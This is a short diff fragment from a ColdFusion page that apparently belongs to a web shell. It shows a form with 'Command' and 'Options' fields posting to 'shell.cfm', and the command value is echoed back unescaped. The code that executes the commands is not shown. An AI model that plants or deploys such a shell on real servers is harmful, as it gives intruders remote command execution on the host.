@@ -10,7 +10,7 @@ Notes:<br><br>
 <p>
 <cfoutput>
 <table>
-<form method="POST" action="pienas2.cfm">
+<form method="POST" action="shell.cfm">
 <tr><td>Command:</td><td><input type=text name="cmd" size=50 
   <cfif isdefined("form.cmd")>value="#form.cmd#"</cfif>><br></td></tr>
 <tr><td>Options:</td><td> <input type=text name="opts" size=50 
